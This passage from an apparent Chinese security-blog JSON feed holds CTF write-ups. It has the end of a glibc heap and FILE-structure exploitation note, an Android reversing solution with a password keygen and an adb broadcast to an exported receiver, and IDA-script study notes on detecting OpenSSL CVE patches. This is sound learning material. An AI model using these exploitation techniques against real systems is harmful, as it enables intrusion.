_IO_save_base = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_backup_base = <span class=\"number\">0x563e47a6c420</span> <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">    _IO_save_end = <span class=\"number\">0x7f85fb627a6d</span> &lt;setcontext+<span class=\"number\">61</span>&gt; <span class=\"string\">&quot;H\\213\\242\\240&quot;</span>,</span><br><span class=\"line\">    _markers = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _chain = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _fileno = <span class=\"number\">0</span>,</span><br><span class=\"line\">    _flags2 = <span class=\"number\">0</span>,</span><br><span class=\"line\">    _old_offset = <span class=\"number\">0</span>,</span><br><span class=\"line\">    _cur_column = <span class=\"number\">0</span>,</span><br><span class=\"line\">    _vtable_offset = <span class=\"number\">0</span> <span class=\"string\">&#x27;\\000&#x27;</span>,</span><br><span class=\"line\">    _shortbuf = <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">    _lock = <span class=\"number\">0x563e47a6c000</span>,</span><br><span class=\"line\">    _offset = <span class=\"number\">0</span>,</span><br><span class=\"line\">    _codecvt = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _wide_data = <span class=\"number\">0x563e47a6c3a0</span>,</span><br><span class=\"line\">    _freeres_list = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _freeres_buf = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    __pad5 = <span class=\"number\">0</span>,</span><br><span class=\"line\">    _mode = <span class=\"number\">0</span>,</span><br><span class=\"line\">    _unused2 = <span class=\"string\">&#x27;\\000&#x27;</span> &lt;repeats <span class=\"number\">19</span> times&gt;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  vtable = <span class=\"number\">0x7f85fb7ea0e0</span> &lt;_IO_wfile_jumps+<span class=\"number\">32</span>&gt;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>接下来就是如何触发 exit，利用__malloc_assert 报错，这里可以修改 topchunk 的 size 进行报错。这里依旧可以选择进行 largebin attack. 文章最开始有介绍如何进行连续的两次 attack 。</p>\n",
            "tags": [
                "pwn"
            ]
        },
        {
            "id": "http://example.com/2022/07/20/360dsctf2022-eznote/",
            "url": "http://example.com/2022/07/20/360dsctf2022-eznote/",
            "title": "360dsctf2022_eznote",
            "date_published": "2022-07-20T08:40:00.000Z",
            "content_html": "",
            "tags": []
        },
        {
            "id": "http://example.com/2022/07/18/adworld-%E5%9F%BA%E7%A1%80%E7%9A%84android/",
            "url": "http://example.com/2022/07/18/adworld-%E5%9F%BA%E7%A1%80%E7%9A%84android/",
            "title": "adworld_基础的android",
            "date_published": "2022-07-18T03:08:17.000Z",
            "content_html": "<h1 id=\"adworld_mobile基础的android\"><a class=\"markdownIt-Anchor\" href=\"#adworld_mobile基础的android\">#</a> adworld_mobile—— 基础的 android</h1>\n<h5 id=\"这是一个新的系列这里记录的是我自己在学习安卓逆向过程中的刷题记录\"><a class=\"markdownIt-Anchor\" href=\"#这是一个新的系列这里记录的是我自己在学习安卓逆向过程中的刷题记录\">#</a> 这是一个新的系列，这里记录的是我自己在学习安卓逆向过程中的刷题记录。</h5>\n<h3 id=\"首先我们来看看项目的注册声明\"><a class=\"markdownIt-Anchor\" href=\"#首先我们来看看项目的注册声明\">#</a> 首先我们来看看项目的注册声明</h3>\n<h4 id=\"mainfestxml\"><a class=\"markdownIt-Anchor\" href=\"#mainfestxml\">#</a> Mainfest.xml</h4>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span> encoding=<span class=\"string\">&quot;UTF-8&quot;</span>?&gt;</span><br><span class=\"line\">&lt;manifest android:versionCode=<span class=\"string\">&quot;1&quot;</span> android:versionName=<span class=\"string\">&quot;1.0&quot;</span> <span class=\"keyword\">package</span>=<span class=\"string\">&quot;com.example.test.ctf02&quot;</span> platformBuildVersionCode=<span class=\"string\">&quot;24&quot;</span> platformBuildVersionName=<span class=\"string\">&quot;7.0&quot;</span> xmlns:android=<span class=\"string\">&quot;http://schemas.android.com/apk/res/android&quot;</span>&gt;</span><br><span class=\"line\">  &lt;uses-sdk android:minSdkVersion=<span class=\"string\">&quot;14&quot;</span> android:targetSdkVersion=<span class=\"string\">&quot;24&quot;</span> /&gt;</span><br><span class=\"line\">  &lt;application android:allowBackup=<span class=\"string\">&quot;true&quot;</span> android:debuggable=<span class=\"string\">&quot;true&quot;</span> android:icon=<span class=\"string\">&quot;@mipmap/ic_launcher&quot;</span> android:label=<span class=\"string\">&quot;@string/app_name&quot;</span> android:supportsRtl=<span class=\"string\">&quot;true&quot;</span> android:theme=<span class=\"string\">&quot;@style/AppTheme&quot;</span>&gt;</span><br><span class=\"line\">    &lt;activity android:name=<span class=\"string\">&quot;com.example.test.ctf02.MainActivity&quot;</span>&gt;<span class=\"comment\">//第一个调用的activity</span></span><br><span class=\"line\">      &lt;intent-filter&gt;</span><br><span class=\"line\">        &lt;action android:name=<span class=\"string\">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span><br><span class=\"line\">        &lt;category android:name=<span class=\"string\">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span><br><span class=\"line\">      &lt;/intent-filter&gt;</span><br><span class=\"line\">    &lt;/activity&gt;</span><br><span class=\"line\">    &lt;receiver android:enabled=<span class=\"string\">&quot;true&quot;</span> android:exported=<span class=\"string\">&quot;true&quot;</span> android:name=<span class=\"string\">&quot;com.example.test.ctf02.GetAndChange&quot;</span>&gt;</span><br><span class=\"line\">        <span class=\"comment\">//允许广播————这个activity允许外部调用,广播接收器的名字是com.example.test.ctf02.GetAndChange</span></span><br><span class=\"line\">      &lt;intent-filter&gt;</span><br><span class=\"line\">        &lt;action android:name=<span class=\"string\">&quot;android.is.very.fun&quot;</span> /&gt;</span><br><span class=\"line\">      &lt;/intent-filter&gt;</span><br><span class=\"line\">    &lt;/receiver&gt;</span><br><span class=\"line\">    &lt;activity android:name=<span class=\"string\">&quot;com.example.test.ctf02.NextContent&quot;</span> /&gt;</span><br><span class=\"line\">    &lt;activity android:name=<span class=\"string\">&quot;com.example.test.ctf02.MainActivity2&quot;</span> /&gt;</span><br><span class=\"line\">  &lt;/application&gt;</span><br><span class=\"line\">&lt;/manifest&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"我们直接看入口点的位置\"><a class=\"markdownIt-Anchor\" href=\"#我们直接看入口点的位置\">#</a> 我们直接看入口点的位置</h3>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//...</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">MainActivity</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AppCompatActivity</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Button login;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> EditText passWord;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">MainActivity</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">static</span> EditText access$<span class=\"number\">000</span>(MainActivity arg1) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> arg1.passWord;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onCreate</span><span class=\"params\">(Bundle arg3)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>.onCreate(arg3);</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.setContentView(<span class=\"number\">0x7F04001A</span>);</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.passWord = <span class=\"built_in\">this</span>.findViewById(<span class=\"number\">0x7F0B0055</span>);</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.login = <span class=\"built_in\">this</span>.findViewById(<span class=\"number\">0x7F0B0056</span>);</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.login.setOnClickListener(<span class=\"keyword\">new</span> <span class=\"title class_\">View$OnClickListener</span>() &#123;</span><br><span class=\"line\">            <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onClick</span><span class=\"params\">(View arg7)</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">Check</span>().checkPassword(MainActivity.<span class=\"built_in\">this</span>.passWord.getText().toString())) &#123;</span><br><span class=\"line\">                    <span class=\"comment\">//我们关注的是这个check类的检查方式</span></span><br><span class=\"line\">                    Toast.makeText(MainActivity.<span class=\"built_in\">this</span>, <span class=\"string\">&quot;Good,Please go on!&quot;</span>, <span class=\"number\">0</span>).show();</span><br><span class=\"line\">                    MainActivity.<span class=\"built_in\">this</span>.startActivity(<span class=\"keyword\">new</span> <span class=\"title class_\">Intent</span>(MainActivity.<span class=\"built_in\">this</span>, MainActivity2.class));</span><br><span class=\"line\">                    MainActivity.<span class=\"built_in\">this</span>.finish();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    Toast.makeText(MainActivity.<span class=\"built_in\">this</span>, <span class=\"string\">&quot;Failed&quot;</span>, <span class=\"number\">0</span>).show();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"check类的定义\"><a class=\"markdownIt-Anchor\" href=\"#check类的定义\">#</a> check 类的定义</h3>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.example.test.ctf02;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Check</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">Check</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">checkPassword</span><span class=\"params\">(String arg7)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> <span class=\"variable\">v5</span> <span class=\"operator\">=</span> <span class=\"number\">12</span>;</span><br><span class=\"line\">        <span class=\"type\">boolean</span> <span class=\"variable\">v2</span> <span class=\"operator\">=</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">        <span class=\"type\">char</span>[] v1 = arg7.toCharArray();</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(v1.length == v5) &#123;</span><br><span class=\"line\">            <span class=\"type\">int</span> <span class=\"variable\">v0</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">            <span class=\"keyword\">while</span>(<span class=\"literal\">true</span>) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(v0 &lt; v1.length) &#123;</span><br><span class=\"line\">                    v1[v0] = ((<span class=\"type\">char</span>)(<span class=\"number\">0xFF</span> - v0 - <span class=\"number\">100</span> - v1[v0]));</span><br><span class=\"line\">                    <span class=\"keyword\">if</span>(v1[v0] == <span class=\"number\">0x30</span> &amp;&amp; v0 &lt; v5) &#123;</span><br><span class=\"line\">                        ++v0;</span><br><span class=\"line\">                        <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> v2;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            v2 = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> v2;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>首先长度限制为 12，然后将我们输入的字符串转为字符数组，根据代码我们写出逆向解析</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ss = []</span><br><span class=\"line\"><span class=\"comment\">#0xff-i-100-ord(ss[i])==0x30</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">12</span>):</span><br><span class=\"line\">\tss.append(<span class=\"built_in\">chr</span>(<span class=\"number\">0xff</span>-<span class=\"number\">0x30</span>-<span class=\"number\">100</span>-i))</span><br><span class=\"line\">key = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> ss:</span><br><span class=\"line\">\tkey+=i</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(key)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#结果为：   “kjihgfedcba`”</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"mainactivity2\"><a class=\"markdownIt-Anchor\" href=\"#mainactivity2\">#</a> MainActivity2</h2>\n<p>这里完成之后，MainActivity 会调用 MainActivity2。但是在 Manifest 中没有对其进行声明（这回有什么影响吗？）但是 app 貌似已经进入了。</p>\n<p>接着就是对图片的处理，要求我们输入现实吗，但是显示码在哪里？</p>\n<p><img data-src=\"E:%5CmyBLOG%5Cblog%5Csource_posts%5Cadworld-%E5%9F%BA%E7%A1%80%E7%9A%84android%5Cimage-20220718122215383.png\" alt=\"image-20220718122215383\"></p>\n<p>这里就引用了 MainActivity2 的部分，</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">MainActivity2</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AppCompatActivity</span> &#123;</span><br><span class=\"line\">    Button button;</span><br><span class=\"line\">    EditText editText;</span><br><span class=\"line\">    ImageView imageView;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">MainActivity2</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">init</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.imageView = <span class=\"built_in\">this</span>.findViewById(<span class=\"number\">0x7F0B0029</span>);</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.imageView.setImageResource(<span class=\"number\">0x7F020053</span>);</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.editText = <span class=\"built_in\">this</span>.findViewById(<span class=\"number\">0x7F0B0057</span>);</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.button = <span class=\"built_in\">this</span>.findViewById(<span class=\"number\">0x7F0B0056</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onCreate</span><span class=\"params\">(Bundle arg3)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>.onCreate(arg3);</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.setContentView(<span class=\"number\">0x7F04001B</span>);</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.init();</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.button.setOnClickListener(<span class=\"keyword\">new</span> <span class=\"title class_\">View$OnClickListener</span>() &#123;</span><br><span class=\"line\">            <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onClick</span><span class=\"params\">(View arg4)</span> &#123;</span><br><span class=\"line\">                MainActivity2.<span class=\"built_in\">this</span>.sendBroadcast(<span class=\"keyword\">new</span> <span class=\"title class_\">Intent</span>(MainActivity2.<span class=\"built_in\">this</span>.editText.getText().toString()));</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">  </span><br></pre></td></tr></table></figure>\n<p>到那时我并不是很理解这些代码都是什么意思。我猜测 imageView 是与我们的图像有关，而且下面我看到了 click，会将我们输入的字符串广播发送，发送对象是谁呢？这里我不是很清楚，但是这是一个 intent 类（intent 应该是一个广播报文，用于组件之间的数据传递）. 在 manifest 中见过，注册了接收器 ——com.example.test.ctf02.GetAndChange，然后我去搜索了一下 intentfilter 是一个白名单过滤器，注册的时候。声明了广播的注册，接收者，以及白名单 “android.is.very.fun”。所以这里的显示码就是这个白名单。</p>\n<p><img data-src=\"E:%5CmyBLOG%5Cblog%5Csource_posts%5Cadworld-%E5%9F%BA%E7%A1%80%E7%9A%84android%5Cimage-20220718160715646.png\" alt=\"image-20220718160715646\"></p>\n<p>虽然到这里我们拿到了 flag。</p>\n<h2 id=\"进一步\"><a class=\"markdownIt-Anchor\" href=\"#进一步\">#</a> 进一步</h2>\n<p>广播接收器在接收到 intent 之后进行了什么？</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">GetAndChange</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">BroadcastReceiver</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">GetAndChange</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onReceive</span><span class=\"params\">(Context arg3, Intent arg4)</span> &#123;</span><br><span class=\"line\">        arg3.startActivity(<span class=\"keyword\">new</span> <span class=\"title class_\">Intent</span>(arg3, NextContent.class));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>他这里又打开了 NextContent，这里出现了两个.jpg 图像，第一个就是我们最开始看到的，而第二个是一个压缩文件，所以这里的逻辑应该就是去处理这所文件，然后进行替换显示，我们在 assets 中看到了压缩文件，也就是 flag 的图片。</p>\n<p>但是到这里，就结束了吗？我们看这个接收器的声明，export 属性是允许其他应用调用当前的组件，所以这个如果这个广播我们可以直接发送，就会直接拿到 flag。所以我们怎么进行广播？一个师傅的做法是利用 adb 调试器，发送如下指令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">adb shell am broadcast -a android.is.very.fun</span><br></pre></td></tr></table></figure>\n<p>解析一下，就是 adb 执行 shell，这个 am 不是很理解，然后 adb shell am 又可以添加一下命令和选项，其中 broadcast 就是广播，-a 是选项允许监听交互的一些通信，最后加上 intent, 这样接收器就可以接收到信息了。</p>\n",
            "tags": [
                "writeup"
            ]
        },
        {
            "id": "http://example.com/2022/06/27/%E5%AD%A6%E4%B9%A0%E5%91%A8%E8%AE%B0-%E2%80%94%E2%80%94%E4%B8%80/",
            "url": "http://example.com/2022/06/27/%E5%AD%A6%E4%B9%A0%E5%91%A8%E8%AE%B0-%E2%80%94%E2%80%94%E4%B8%80/",
            "title": "学习周记 ——一",
            "date_published": "2022-06-27T13:06:06.000Z",
            "content_html": "<h1 id=\"task\"><a class=\"markdownIt-Anchor\" href=\"#task\">#</a> TASK:</h1>\n<p>​\t\t编写 IDA 脚本，不依赖版本号的条件下，利用二进制特征，在 openssl 的 libssl.so 中检查 CVE-2015-0207 和 CVE-2014-3507 是否被修补</p>\n<p>要求：idc 和 python 两个版本都写一下，这个就是把 libssl.so 拖进 ida，然后运行你的脚本，然后弹窗或者输出有没有那两个 cve 存在</p>\n<p>参考链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaGV4LXJheXMuY29tL3Byb2R1Y3RzL2lkYS9zdXBwb3J0L2lkYWRvYy8xNjIuc2h0bWw=\">https://www.hex-rays.com/products/ida/support/idadoc/162.shtml</span>\t\t\t\t按字母顺序排列的 IDC 函数列表</p>\n<p>不依赖版本号，就是使用 ida 通用的函数，</p>\n<h2 id=\"前置diff-dapatch\"><a class=\"markdownIt-Anchor\" href=\"#前置diff-dapatch\">#</a> 前置：diff dapatch</h2>\n<h2 id=\"对于数据的定义\"><a class=\"markdownIt-Anchor\" href=\"#对于数据的定义\">#</a> 对于数据的定义</h2>\n<p>ida 各版本通用的是划分为，整数 long，字符串 string，以及浮点数，而不做具体的划分。或者使用无定形的关键字 auto，定义一个变量。但是在模块中，我们还是要局部变量先声明。可以在任何地方都可以定义定义一个全局变量，关键字为 extern，但是不能在声明的同时，进行赋值。</p>\n<h2 id=\"运算\"><a class=\"markdownIt-Anchor\" href=\"#运算\">#</a> 运算</h2>\n<p>idc 不支持复合赋值运算，比如 i+=2 这样，但是支持三元运算符（？：）。</p>\n<h2 id=\"数据处理\"><a class=\"markdownIt-Anchor\" href=\"#数据处理\">#</a> 数据处理：</h2>\n<p>idc 这种脚本程序，最重要的就是数据的获取以及处理，idc 库提供了相关的数据获取与处理的函数</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">读取内存数据</span><br><span class=\"line\"><span class=\"type\">long</span> <span class=\"title function_\">Byte</span><span class=\"params\">(<span class=\"type\">long</span> addr)</span>;</span><br><span class=\"line\"><span class=\"type\">long</span> <span class=\"title function_\">Word</span><span class=\"params\">(<span class=\"type\">long</span> addr)</span>;</span><br><span class=\"line\"><span class=\"type\">long</span> <span class=\"title function_\">Dword</span><span class=\"params\">(<span class=\"type\">long</span> addr)</span>;</span><br><span class=\"line\">修改内存数据</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">Patchbyte</span><span class=\"params\">(<span class=\"type\">long</span> addr)</span>;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">Patchword</span><span class=\"params\">(<span class=\"type\">long</span> addr)</span>:</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">PatchDword</span><span class=\"params\">(longword)</span>;</span><br><span class=\"line\"><span class=\"comment\">//修改数据的时候，如果提供的数据长度不匹配，从低地址开始有效</span></span><br><span class=\"line\"><span class=\"type\">bool</span> <span class=\"title function_\">isLoaded</span><span class=\"params\">(<span class=\"type\">long</span> addr)</span>;\t<span class=\"comment\">//地址是否包含有效数据</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"用户交互输入输出\"><a class=\"markdownIt-Anchor\" href=\"#用户交互输入输出\">#</a> 用户交互 —— 输入输出</h2>\n<p><img data-src=\"E:%5CmyBLOG%5Cblog%5Csource_posts%5C%E5%AD%A6%E4%B9%A0%E5%91%A8%E8%AE%B0-%E2%80%94%E2%80%94%E4%B8%80%5Cimage-20220629233503199.png\" alt=\"image-20220629233503199\"></p>\n<p>所以物品们尽量使用 Message 函数进行输出 ma ?</p>\n<h2 id=\"处理函数\"><a class=\"markdownIt-Anchor\" href=\"#处理函数\">#</a> 处理函数</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//获取目标地址 *所在* 函数的名字</span><br><span class=\"line\">string\tGetFunctionName(long addr);\t//如果addr不属于一个函数，则返回一个空字符串</span><br><span class=\"line\">long\tNextFunction(long addr);\t//返回addr的下一函数的起始地址，失败返回-1</span><br><span class=\"line\">long\tPrevFunction(long addr);\t//返回addr的之前距离最近的函数的起始地址，失败返回-1</span><br><span class=\"line\">long\tLocByName(string name);\t//根据名字查找函数的起始地址</span><br><span class=\"line\"></span><br><span class=\"line\">//宏定义，非法地址   BADADDR</span><br><span class=\"line\">//交叉引用</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"task1cve-2015-0207\"><a class=\"markdownIt-Anchor\" href=\"#task1cve-2015-0207\">#</a> task1:CVE-2015-0207</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-- a/ssl/d1_lib.c</span><br><span class=\"line\">+++ b/ssl/d1_lib.c</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">dtls1_listen</span><span class=\"params\">(SSL *s, <span class=\"keyword\">struct</span> sockaddr *client)</span></span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">     <span class=\"type\">int</span> ret;</span><br><span class=\"line\"> 